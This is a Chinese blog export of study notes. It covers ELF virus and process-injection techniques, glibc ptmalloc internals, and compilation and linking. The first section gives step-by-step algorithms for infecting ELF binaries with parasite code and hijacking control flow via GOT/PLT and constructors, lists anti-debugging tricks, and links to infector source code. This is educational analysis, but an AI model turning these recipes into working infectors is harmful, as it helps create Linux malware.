<h2 id="进程寄存器状态和标记"><a href="#进程寄存器状态和标记" class="headerlink" title="进程寄存器状态和标记"></a>进程寄存器状态和标记</h2><h2 id="基于ptrace的调试器示例"><a href="#基于ptrace的调试器示例" class="headerlink" title="基于ptrace的调试器示例"></a>基于ptrace的调试器示例</h2><h2 id="内存感染类型"><a href="#内存感染类型" class="headerlink" title="内存感染类型"></a>内存感染类型</h2><table>
<thead>
<tr>
<th>感染技术</th>
<th>目标结果</th>
<th>寄存类型</th>
</tr>
</thead>
<tbody><tr>
<td>GOT感染</td>
<td>劫持共享库函数</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>过程链接表(PLT)感染</td>
<td>劫持共享库函数</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>.ctors/.dtors感染</td>
<td>将控制流转向恶意代码</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>Function trampolines（函数蹦床）</td>
<td>劫持任意函数</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>共享库注入</td>
<td>插入恶意代码</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>重定位代码注入</td>
<td>插入恶意代码</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>直接修改text段</td>
<td>插入恶意代码</td>
<td>进程内存或可执行文件</td>
</tr>
<tr>
<td>进程占用（将整段程序注入地址空间）</td>
<td>运行隐藏在现存进程中的完全不同的可执行文件</td>
<td>进程内存</td>
</tr>
</tbody></table>
<h2 id="进程镜像重建"><a href="#进程镜像重建" class="headerlink" title="进程镜像重建"></a>进程镜像重建</h2><h3 id="重建可执行文件的目标"><a href="#重建可执行文件的目标" class="headerlink" title="重建可执行文件的目标"></a>重建可执行文件的目标</h3><ul>
<li>进程ID作为参数，将该ID对应的进程镜像重建成对应的可执行文件。</li>
<li>构建节头的最小集，以便可以使用objdump和gdb这样的工具进行更精确的分析。</li>
</ul>
<h3 id="重建过程算法"><a href="#重建过程算法" class="headerlink" title="重建过程算法"></a>重建过程算法</h3><p>1.定位可执行文件(text段)的基址。</p>
<p>2.通过解析ELF文件头来定位程序头表。</p>
<p>3.解析程序头表，找出数据段。</p>
<p>4.将数据段读到缓存中，并定位数据段中的动态段，然后定位GOT。使用动态段中的d_tag来定位GOT。</p>
<p>5.一旦定位到GOT，就需要将GOT恢复到运行之前的装填。</p>
<p>6.需要修改为puts()保留的GOT条目，重新指向PLT存根代码，这段代码的作用是将GOT偏移地址压入栈。</p>
<p>7.选择性地重建节头表。然后将text段和data段(以及节头表)写到磁盘。</p>
<h1 id="ELF病毒技术"><a href="#ELF病毒技术" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h1><h2 id="ELF病毒技术-1"><a href="#ELF病毒技术-1" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h2><p>ELF病毒的首要目标是劫持控制流，暂时改变程序执行的路径来执行寄生病毒。</p>
<h2 id="ELF病毒寄生代码感染方法"><a href="#ELF病毒寄生代码感染方法" class="headerlink" title="ELF病毒寄生代码感染方法"></a>ELF病毒寄生代码感染方法</h2><h3 id="Silvio填充感染"><a href="#Silvio填充感染" class="headerlink" title="Silvio填充感染"></a>Silvio填充感染</h3><p>这种方法利用了内存中text段和data段之间存在的一页大小的填充空间。</p>
<p>相关论文：Unix ELF parasites and viruses(<a href="http://vxheaven.org/lib/vsc01.html" target="_blank" rel="noopener">http://vxheaven.org/lib/vsc01.html</a>)</p>
<h4 id="text感染算法"><a href="#text感染算法" class="headerlink" title=".text感染算法"></a>.text感染算法</h4><p>1.将ELF文件头中的ehdr-&gt;e_shoff增加PAGE_SIZE的大小值。</p>
<p>2.定位text段的phdr。</p>
<ul>
<li>将入口点修改为寄生代码的位置：ehdr-&gt;e_entry=phdr[TEXT].p_vaddr+phdr[TEXT].p_filesz。</li>
<li>将phdr[TEXT].p_filesz增加寄生代码的长度值。</li>
<li>将phdr[TEXT].p_memsz增加寄生代码的长度值。</li>
</ul>
<p>3.对每个phdr，如果对应的段位于寄生代码之后，则将phdr[x].p_offset增加PAGE_SIZE大小。</p>
<p>4.找到text段的最后一个shdr，将shdr[x].sh_size增加寄生代码长度值。</p>
<p>5.对每个位于寄生代码插入位置之后的shdr，将shdr[x].sh_offset增加PAGE_SIZE大小。</p>
<p>6.将真正的寄生代码插入到text段的file_base+phdr[TEXT].p_filesz。</p>
<p>相关代码示例： <a href="http://www.bitlackeys.org/projects/lpv.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/lpv.c</a></p>
<h3 id="逆向text感染"><a href="#逆向text感染" class="headerlink" title="逆向text感染"></a>逆向text感染</h3><p>前提：堆text段进行逆向扩展，在逆向扩展过程中，需要将text段的虚拟地址缩减PAGE_ALIGN(parasite_size)。</p>
<h4 id="逆向text感染算法"><a href="#逆向text感染算法" class="headerlink" title="逆向text感染算法"></a>逆向text感染算法</h4><p>1.将ehdr-&gt;e_shoff增加PAGE_ROUND(parasite_len)</p>
<p>2.找到text段和phdr，保存p_vaddr的初始值。</p>
<ul>
<li>将p_vaddr减小PAGE_ROUND(parasite_len)。</li>
<li>将p_paddr减小PAGE_ROUND(parasite_len)。</li>
<li>将p_filesz增加PAGE_ROUND(parasite_len)。</li>
<li>将p_memsz增加PAGE_ROUND(parasite_len)。</li>
</ul>
<p>3.找出所有的p_offset比text的p_offset的phdr，并将对应的p_offset增加PAGE_ROUND(parasite_len)；这步操作会将phdr前移，为逆向text扩展腾出空间。</p>
<p>4.将ehdr-&gt;e_entry设置为：</p>
<p>orig_text_vaddr - PAGE_ROUND(parasite_len) +sizeof(ElfN_Ehdr)</p>
<p>5.将ehdr_e_phoff增加PAGE_ROUND(parasite_len)。</p>
<p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p>
<p>相关代码：<a href="http://www.bitlackeys.org/projects/text-infector.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/text-infector.tgz</a> </p>
<p>相应杀毒程序：<a href="http://www.bitlackeys.org/projects/skeksi_disinfect.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/skeksi_disinfect.c</a></p>
<h3 id="data段感染"><a href="#data段感染" class="headerlink" title="data段感染"></a>data段感染</h3><h4 id="data段感染算法"><a href="#data段感染算法" class="headerlink" title="data段感染算法"></a>data段感染算法</h4><p>1.将ehdr_e_shoff增加寄生代码的长度。</p>
<p>2.定位data段phdr。</p>
<ul>
<li>将ehdr-&gt;e_entry指向寄生代码所在位置：phdr-&gt;p_vaddr + phdr-&gt;p_filesz</li>
<li>将phdr-&gt;p_filesz增加寄生代码长度</li>
<li>将phdr-&gt;p_memsz增加寄生代码的长度</li>
</ul>
<p>3.调整.bss节头，使其偏移量和地址能够反映出寄生代码的结束位置。</p>
<p>4.设置data段的权限(设置了NX-bit的系统)：</p>
<ul>
<li>phdr[DATA].p_flags != PF_X;</li>
</ul>
<p>5.（可选）使用假名为寄生代码添加一个节头。（防止有人运行了/usr/bin/strip<infected_program>，会将没有进行节头说明的寄生代码清理掉）</p>
<p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p>
<h2 id="PT-NOTE到PT-LOAD转换感染"><a href="#PT-NOTE到PT-LOAD转换感染" class="headerlink" title="PT_NOTE到PT_LOAD转换感染"></a>PT_NOTE到PT_LOAD转换感染</h2><p>原理：将PT_NOTE段的类型改为PT_LOAD，然后将段的位置移到其他所有段之后。当然，也可以通过创建一个PT_LOAD phdr条目来创建一个新的段，但是由于程序在没有PT_NOTE段时仍将执行，因此将其转换为PT_LOAD类型。</p>
<h4 id="PT-NOTE到PT-LOAD转换感染算法"><a href="#PT-NOTE到PT-LOAD转换感染算法" class="headerlink" title="PT_NOTE到PT_LOAD转换感染算法"></a>PT_NOTE到PT_LOAD转换感染算法</h4><p>1.定位data段phdr。</p>
<ul>
<li>找到data段结束的地址：ds_end_addr = phdr-&gt;p_vaddr + p_memsz</li>
<li>找到data段结束的文件偏移量：da_end_off = phdr-&gt;p_offset + p_filesz</li>
<li>获取到可加载段的对齐大小：align_size = phdr-&gt;p_align</li>
</ul>
<p>2.定位PT_NOTE phdr。</p>
<ul>
<li><p>将phdr转换成PT_LOAD：phdr-&gt;p_type = PT_LOAD；</p>
</li>
<li><p>将下面起始地址赋给phdr：ds_end_addr + align_size</p>
</li>
<li><p>将寄生代码的长度赋给phdr：phdr-&gt;p_filesz += parasite_size;  phdr-&gt;p_memsz += parasite_size</p>
</li>
</ul>
<p>3.对新建的段进行说明：ehdr-&gt;e_shoff += parasite_size。</p>
<p>4.创建一个新的二进制文件映射出ELF头的修改和新的段，插入真正的寄生代码。</p>
<h2 id="感染控制流"><a href="#感染控制流" class="headerlink" title="感染控制流"></a>感染控制流</h2><h3 id="直接PLT感染"><a href="#直接PLT感染" class="headerlink" title="直接PLT感染"></a>直接PLT感染</h3><p>修改PLT代码，使其存放一条完全不同的指令来改变控制流。</p>
<h3 id="函数蹦床"><a href="#函数蹦床" class="headerlink" title="函数蹦床"></a>函数蹦床</h3><p>使用某种能够改变控制流的分支指令重写函数代码的前5~7个字节。重写完后调用的的即为要想调用的函数。</p>
<h3 id="重写-ctors-dtors函数指针"><a href="#重写-ctors-dtors函数指针" class="headerlink" title="重写.ctors/.dtors函数指针"></a>重写.ctors/.dtors函数指针</h3><p>.ctors/.init_array 函数指针会在 main()函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。.dtors/.fini_array 函数指针在 main()函数执行完之后才被触发。</p>
<h3 id="GOT感染或PLT-GOT重定向"><a href="#GOT感染或PLT-GOT重定向" class="headerlink" title="GOT感染或PLT/GOT重定向"></a>GOT感染或PLT/GOT重定向</h3><p>相关论文： Modern Day ELF Runtime infection via GOT poisoning（<a href="http://vxheaven.org/lib/vrn00.html）" target="_blank" rel="noopener">http://vxheaven.org/lib/vrn00.html）</a></p>
<h3 id="感染数据结构"><a href="#感染数据结构" class="headerlink" title="感染数据结构"></a>感染数据结构</h3><h3 id="函数指针重写"><a href="#函数指针重写" class="headerlink" title="函数指针重写"></a>函数指针重写</h3><h2 id="进程内存病毒和rootkits——远程代码注入技术"><a href="#进程内存病毒和rootkits——远程代码注入技术" class="headerlink" title="进程内存病毒和rootkits——远程代码注入技术"></a>进程内存病毒和rootkits——远程代码注入技术</h2><h3 id="共享库注入"><a href="#共享库注入" class="headerlink" title="共享库注入"></a>共享库注入</h3><h4 id="so感染-ET-DYN感染"><a href="#so感染-ET-DYN感染" class="headerlink" title=".so感染/ET_DYN感染"></a>.so感染/ET_DYN感染</h4><p>这项技术可以用来将一个共享库注入到已存在的进程地址空间中，注入共享库后，需要通过PLT/GOT重定向、函数蹦床等将控制流使用前面的感染点之一重定向到共享库。</p>
<h5 id="so感染——使用LD-PRELOAD"><a href="#so感染——使用LD-PRELOAD" class="headerlink" title=".so感染——使用LD_PRELOAD"></a>.so感染——使用LD_PRELOAD</h5><p>通过设置LD_PRELOAD环境变量，将我们想要的共享库放在其他共享库之前加载。</p>
<h5 id="so感染——利用open-mmap"><a href="#so感染——利用open-mmap" class="headerlink" title=".so感染——利用open()/mmap()"></a>.so感染——利用open()/mmap()</h5><p>通过往已存在的进程的text段注入shellcode，并执行shellcode。利用共享库的open/mmap操作，将任何文件注入到进程的地址空间中。</p>
<h5 id="so感染——利用dloen"><a href="#so感染——利用dloen" class="headerlink" title=".so感染——利用dloen()"></a>.so感染——利用dloen()</h5><p>程序可以通过dlopen()/_libc_dlopen_mode()函数凭空加载一个共享库。</p>
<p>但在使用_libc_dlopen_mode()之前，要先得到想要感染进程中的libc基址，解析_libc_dlopen_mode()的符号，然后将符号值st_value与libc相加得到最终地址。</p>
<h5 id="so感染——使用vdso控制技术"><a href="#so感染——使用vdso控制技术" class="headerlink" title=".so感染——使用vdso控制技术"></a>.so感染——使用vdso控制技术</h5><h3 id="text段代码注入"><a href="#text段代码注入" class="headerlink" title="text段代码注入"></a>text段代码注入</h3><h3 id="可执行文件注入"><a href="#可执行文件注入" class="headerlink" title="可执行文件注入"></a>可执行文件注入</h3><p>elfdemon： <a href="http://www.bitlackeys.org/projects/elfdemon.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfdemon.tgz</a></p>
<h3 id="重定位代码注入——ET-REL注入"><a href="#重定位代码注入——ET-REL注入" class="headerlink" title="重定位代码注入——ET_REL注入"></a>重定位代码注入——ET_REL注入</h3><h2 id="ELF反调试和封装技术"><a href="#ELF反调试和封装技术" class="headerlink" title="ELF反调试和封装技术"></a>ELF反调试和封装技术</h2><h3 id="PTRACE-TRACEME技术"><a href="#PTRACE-TRACEME技术" class="headerlink" title="PTRACE_TRACEME技术"></a>PTRACE_TRACEME技术</h3><p>进程追踪有一个特性：一个程序在同一时间只能被一个进程追踪。</p>
<p>这项技术的思路就是让程序追踪自身，这样调试器就无法附加到该进程了。</p>
<h3 id="SIGTRAP处理技术"><a href="#SIGTRAP处理技术" class="headerlink" title="SIGTRAP处理技术"></a>SIGTRAP处理技术</h3><p>使用这项技术，程序可以设置一个信号处理器来捕获SIGTRAP信号，然后故意发出一个断点指令，信号处理器捕捉到SIGTRAP信号后，会将一个全局变量从0加到1。随后检查这个全局变量，如果为1，则说明未被调试；如果为0，说明正在被调试，为了防止被调试，可以终止进程或者退出。</p>
<h3 id="proc-self-status技术"><a href="#proc-self-status技术" class="headerlink" title="/proc/self/status技术"></a>/proc/self/status技术</h3><p>/proc/self/status中的”TracerPid”对应值0表示没用被追踪，如果不为0，则表明正在被追踪。</p>
<h3 id="代码混淆技术"><a href="#代码混淆技术" class="headerlink" title="代码混淆技术"></a>代码混淆技术</h3><p>通过修改汇编层的代码来引入不明确的分支指令或者未对其指令，使得反汇编程序无法正确地读取字节码文件。</p>
<h3 id="字符串表转换技术"><a href="#字符串表转换技术" class="headerlink" title="字符串表转换技术"></a>字符串表转换技术</h3><p>这项技术会打乱每个符号名和节相关信息的顺序，以致可能出现的结果就是所有的节头、函数名和符号名看上去都是乱序混在一起的。</p>
<p>相关代码：<a href="http://www.bitlackeys.org/projects/elfscure.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfscure.c</a> </p>
<h2 id="ELF病毒检测和杀毒"><a href="#ELF病毒检测和杀毒" class="headerlink" title="ELF病毒检测和杀毒"></a>ELF病毒检测和杀毒</h2><p>VMA Voodoo（<a href="http://www.bitlackeys.org/#vmavudu）" target="_blank" rel="noopener">http://www.bitlackeys.org/#vmavudu）</a><br>AVU(Anti Virus UNIX）：<a href="http://www.bitlackeys.org/projects/avu32.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/avu32.tgz</a></p>
<h1 id="Linux二进制保护"><a href="#Linux二进制保护" class="headerlink" title="Linux二进制保护"></a>Linux二进制保护</h1><h2 id="ELF二进制加壳器"><a href="#ELF二进制加壳器" class="headerlink" title="ELF二进制加壳器"></a>ELF二进制加壳器</h2><p>加壳器：用来对可执行文件进行压缩或加密，来对代码和数据进行混淆。</p>
<h2 id="存根机制和用户层执行"><a href="#存根机制和用户层执行" class="headerlink" title="存根机制和用户层执行"></a>存根机制和用户层执行</h2><p>软件保护器由以下两个程序组成：保护阶段的代码（应用到目标二进制文件上的保护程序）、运行时引擎或存根（与目标二进制文件合并在一起，负责运行时反混淆和反调试的程序。）</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>《ptmalloc》</title>
    <url>/2020/05/09/%E7%AC%94%E8%AE%B0/ptmalloc/ptmalloc/</url>
    <content><![CDATA[<h1 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h1><h2 id="内存管理的方法"><a href="#内存管理的方法" class="headerlink" title="内存管理的方法"></a>内存管理的方法</h2><h3 id="c风格的内存管理程序"><a href="#c风格的内存管理程序" class="headerlink" title="c风格的内存管理程序"></a>c风格的内存管理程序</h3><h3 id="池式内存管理"><a href="#池式内存管理" class="headerlink" title="池式内存管理"></a>池式内存管理</h3><p>内存池是一种半内存管理方法。内存池帮助某些程序进行自动内存管理，这些程序会经历一些特定的阶段，而且每个阶段中都有分配给进程的特定阶段内存。</p>
<h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><p>收集器没有找到的就是垃圾，可以被销毁并重新使用这些无用数据</p>
<h2 id="内存管理器的设计目标"><a href="#内存管理器的设计目标" class="headerlink" title="内存管理器的设计目标"></a>内存管理器的设计目标</h2><h3 id="最大化兼容性"><a href="#最大化兼容性" class="headerlink" title="最大化兼容性"></a>最大化兼容性</h3><h3 id="最大化可移植性"><a href="#最大化可移植性" class="headerlink" title="最大化可移植性"></a>最大化可移植性</h3><h3 id="浪费最小的空间"><a href="#浪费最小的空间" class="headerlink" title="浪费最小的空间"></a>浪费最小的空间</h3><h3 id="最快的速度"><a href="#最快的速度" class="headerlink" title="最快的速度"></a>最快的速度</h3><h3 id="最大化可调度性（以适应不同的情况）"><a href="#最大化可调度性（以适应不同的情况）" class="headerlink" title="最大化可调度性（以适应不同的情况）"></a>最大化可调度性（以适应不同的情况）</h3><h3 id="最大化局部性-Locality"><a href="#最大化局部性-Locality" class="headerlink" title="最大化局部性(Locality)"></a>最大化局部性(Locality)</h3><h3 id="最大化调试功能"><a href="#最大化调试功能" class="headerlink" title="最大化调试功能"></a>最大化调试功能</h3><h3 id="最大化适应性"><a href="#最大化适应性" class="headerlink" title="最大化适应性"></a>最大化适应性</h3><h2 id="常见c内存管理程序"><a href="#常见c内存管理程序" class="headerlink" title="常见c内存管理程序"></a>常见c内存管理程序</h2><h3 id="Doug-Lea-Malloc"><a href="#Doug-Lea-Malloc" class="headerlink" title="Doug Lea Malloc"></a>Doug Lea Malloc</h3><h3 id="BSD-Malloc"><a href="#BSD-Malloc" class="headerlink" title="BSD Malloc"></a>BSD Malloc</h3><h3 id="Hoard"><a href="#Hoard" class="headerlink" title="Hoard"></a>Hoard</h3><h3 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h3><h2 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h2><h3 id="chunk格式"><a href="#chunk格式" class="headerlink" title="chunk格式"></a>chunk格式</h3><h4 id="使用中："><a href="#使用中：" class="headerlink" title="使用中："></a>使用中：</h4><p><img src="./png/using-chunk.jpg" alt="using-chunk"></p>
<p>P：为0时表示前一个chunk空闲，这时prev_size才有效</p>
<p>​      为1时表示前一个chunk正在使用中，prev_size无效</p>
<p>M：为1表示该chunk从mmap映射区域分配，否则是从heap区域分配</p>
<p>A：如果为1表示该chunk属于非主分配区，否则置为0</p>
<h4 id="free后："><a href="#free后：" class="headerlink" title="free后："></a>free后：</h4><p><img src="./png/freed-chunk.jpg" alt="using-chunk"></p>
<p>fd：指向后一个空闲指针</p>
<p>bk：指向前一个空闲指针</p>
<p>若为large bin，则多含有fd_nextsize和bk_nextsize，用于加快large bin查找最近匹配的空闲chunk</p>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>free后p位置0，同时检查相邻的chunk，若空闲则合并</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>free后p位不置0，不合并chunk，但在一定条件下fastbin会合并（如分配large bin，详见<a href="http://blog.chinaunix.net/uid-27767798-id-4107020.html）。" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27767798-id-4107020.html）。</a></p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>使用bins数组的第一个，如果被用户释放的chunk大于max_fast或者fastbins中的空闲chunk合并后，这些chunk首先会放入unsort bin队列中。分配时若在fastbins中未找到合适的chunk，会优先在unsort bins中查找空闲的chunk，然后才查找bins。如果unsort bins不满足分配要求，malloc便会将unsort bin中的chunk加入bins，然后从bins中继续进行查找和分配过程。</p>
<h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>在分配时总是在fastbins和bins之后考虑，分主分配区和非主分配区两种考虑</p>
<h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>直接mmap申请的内存，释放时直接将内存归还操作系统，不会进入任何bin中</p>
<h4 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h4><p>当需要分配一个small chunk，但在small bins中找不到合适的chunk时，如果last remainder chunk的大小大于所需的small chunk大小，last remainder chunk被分裂成两个chunk，其中一个chunk返回给用户，另一个chunk变成新的last remainder chunk。</p>
<h4 id="分配时查找顺序"><a href="#分配时查找顺序" class="headerlink" title="分配时查找顺序"></a>分配时查找顺序</h4><p>查找fast bins–&gt;查找small bins–&gt;合并fast bins，并入unsort bins，查找unsort bin–&gt;把unsort bin全加入large bins中，查找large bins–&gt;考虑top chunk</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>glibc</tag>
        <tag>笔记</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>《程序员的自我修养》</title>
    <url>/2020/05/09/%E7%AC%94%E8%AE%B0/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
    <content><![CDATA[<h1 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h1><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>主要处理”#”开始的预编译指令，预编译后的文件扩展名为.i</p>
<p>（-E 表示只进行预编译）</p>
<h3 id="主要处理规则："><a href="#主要处理规则：" class="headerlink" title="主要处理规则："></a>主要处理规则：</h3><ol>
<li>将所有的”#define”删除，并且展开所有的宏定义。</li>
<li>处理所有条件预编译指令，比如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”。</li>
<li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置。（注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件）</li>
<li>删除所有的注释”//“和”/**/“</li>
<li>添加行号和文件名表示，比如#2 “hello.c” 2，以便于编译时编译器产生调试用的行号信息，及用于编译时产生编译错误或警告时能够显示行号。</li>
<li>保留所有的”#pragram” 编译器指令，因为编译器需要使用它们。</li>
</ol>
<p>经过预编译后的.i文件不包含任何宏定义，因为所有的宏定义已经被展开，并且包含的文件也已经被插入到.i文件中。（可以通过查看.i文件来判断宏定义是否正确或头文件包含是否正确）</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>可分为6步：扫描、语法分析、语法定义、源代码优化、代码生成和目标代码优化</p>
<p>把预处理完的文件进行一系列的词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件（.s）。</p>
<p>（-S 可得到汇编输出文件，或者直接使用cc1 hello.c也可以直接得到）</p>
<h3 id="词法分析（扫描器）"><a href="#词法分析（扫描器）" class="headerlink" title="词法分析（扫描器）"></a>词法分析（扫描器）</h3><p>首先源代码程序程序被输入到扫描器，运用一种类似有限状态机的算法，将源代码的字符序列分割成一系列的记号。</p>
<p>（lex程序可以实现词法分析）</p>
<h3 id="语法分析（语法分析器）"><a href="#语法分析（语法分析器）" class="headerlink" title="语法分析（语法分析器）"></a>语法分析（语法分析器）</h3><p>对由扫描器产生的记号进行语法分析，从而产生语法树。整个分析过程采用了上下文无关语法的分析手段。简单地讲，由语法分析产生的语法树就是以表达式为节点的树。</p>
<p>（yacc程序可以实现语法分析）</p>
<h3 id="语义分析（语义分析器）"><a href="#语义分析（语义分析器）" class="headerlink" title="语义分析（语义分析器）"></a>语义分析（语义分析器）</h3><p>编译器所能分析的语义是静态语义（所谓静态语义是指在编译器可以确定的语义），与之对应的是动态语义（只有在运行期才能确定的语义）</p>
<p>静态语义通常包含声明和类型的匹配，类型的转换。</p>
<p>经过语义分析阶段后，整个语法书的表达式都被标识了类型，如果有些类型需要做隐式转换，语义分析程序会在语法树中插入相应的转换节点。</p>
<h3 id="中间语言生成（源码级优化器）"><a href="#中间语言生成（源码级优化器）" class="headerlink" title="中间语言生成（源码级优化器）"></a>中间语言生成（源码级优化器）</h3><p>（注：此处源码级优化器在不同编译器中可能会有不同的定义或有其他的一些差异）</p>
<p>源代码级优化器会在源代码级别进行优化。</p>
<p>因为直接在语法树上作优化比较困难，所以源代码优化器往往将整个语法树转换成中间代码，它是语法树的顺序表示，已经非常接近目标代码，但一般跟目标机器和运行时的环境无关。</p>
<p>不同的编译器中有着不同的形式，比较常见的有：三地址码和P-代码。</p>
<p>中间代码使得编译器可以分为前端和后端。编译器前端负责产生机器码无关的中间代码，编译器后端将中间代码转换成目标机器代码</p>
<h3 id="目标代码生成与优化（代码生成器和目标代码优化器）"><a href="#目标代码生成与优化（代码生成器和目标代码优化器）" class="headerlink" title="目标代码生成与优化（代码生成器和目标代码优化器）"></a>目标代码生成与优化（代码生成器和目标代码优化器）</h3><h4 id="代码生成器"><a href="#代码生成器" class="headerlink" title="代码生成器"></a>代码生成器</h4><p>将中间代码转换成目标机器代码。</p>
<h4 id="目标代码优化器"><a href="#目标代码优化器" class="headerlink" title="目标代码优化器"></a>目标代码优化器</h4><p>对目标代码进行优化，比如选择合适的寻址方式、使用位移代替乘法运算、删除多余的指令等。</p>
<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。（.o）</p>
<p>（可用-c来完成汇编过程，或者用as hello.s -o hello）</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>把每个源代码模块独立的编译，然后按照需要将它们“组装”起来，这格组装模块的过程就是链接。链接的主要内容就是把各个模块之间相互引用的部分都处理好，使得各个模块之间能够正确地衔接。</p>
<p>链接过程主要包括了地址和空间分配、符号决议（有时也叫做符号绑定、名称绑定、名称决议，甚至叫做地址绑定、指令绑定。大体上一致，但从细节角度区分，”决议”更倾向静态链接，而”绑定”更倾向动态链接）和重定位等这些步骤。</p>
<p>（因为对于Object文件没有一个很合适的中文名称，把它叫做中间目标文件比较合适，简称为目标文件）</p>
<h5 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h5><p>地址修正的过程也被叫做重定位，每个要被修正的地方叫一个重定位入口。重定位所做的就是给程序中没个这样的绝对地址引用的位置“打补丁”，使它们指向正确的地址</p>
<h5 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h5><p>用来表示一个地址，可能是一段子程序（后来发展成函数）的起始地址，也可以是一个变量的起始地址</p>
<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><h1 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h1><h2 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h2><p>从广义上看，目标文件与可执行文件的格式几乎是一样的。</p>
<p>（file命令可查看相应的文件格式）</p>
<h2 id="目标文件的内容"><a href="#目标文件的内容" class="headerlink" title="目标文件的内容"></a>目标文件的内容</h2><p>目标文件中的内容有：编译后的机械指令代码、数据，符号表、调试信息、字符串等。</p>
<p>一般目标文件将这些信息按不同的属性，以“节”的形式存储，有时候也叫“段”。</p>
<p>程序源代码编译后的机器指令经常被放在代码段里，代码段常见的名字有”.code”或”.text”；全局变量和局部静态变量数据经常放在数据段，数据段一般名字都叫”.data”。</p>
<p>ELF文件的开头是一个”文件头”，然后就是各个段的内容。</p>
<p>一般C语言的编译后执行语句都编译成机器代码，保存在.text段；已初始化的全局变量和局部静态变量都保存在.data段；未初始化的全局变量和局部静态变量一般放在一个叫”.bss”的段里。（”.bss”段只是为未初始化的全局变量和局部静态变量预留位置而已，它并没有内容，所以在文件中也不占据空间）</p>
<p>总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和.bss段属于程序数据。</p>
<h2 id="挖掘SimpleSection-o（书中示例）"><a href="#挖掘SimpleSection-o（书中示例）" class="headerlink" title="挖掘SimpleSection.o（书中示例）"></a>挖掘SimpleSection.o（书中示例）</h2><h3 id="ELF段的结构分析"><a href="#ELF段的结构分析" class="headerlink" title="ELF段的结构分析"></a>ELF段的结构分析</h3><p>段的属性：段的长度、段所在的位置</p>
<h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><h3 id="数据段-data-和只读数据段-rodata"><a href="#数据段-data-和只读数据段-rodata" class="headerlink" title="数据段(.data)和只读数据段(.rodata)"></a>数据段(.data)和只读数据段(.rodata)</h3><p>.data段保存的是那些已经初始化了的全局静态变量和局部静态变量。</p>
<p>.rodata段存放的是只读数据，一般是程序里面的只读变量(如const修饰的变量)和字符串常量。</p>
<h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h3><p>.bss段存放的是(#`O′)初始化的全局变量和局部静态变量。</p>
<p>有些编译器会将全局的未初始化变量存放在目标文件.bss段，有些则不存放，只是预留一个未定义的全局变量符号，到最终链接成可执行文件的时候再在.bss段分配空间。</p>
<p>编译单元内部可见的静态变量是存放在.bss段的。</p>
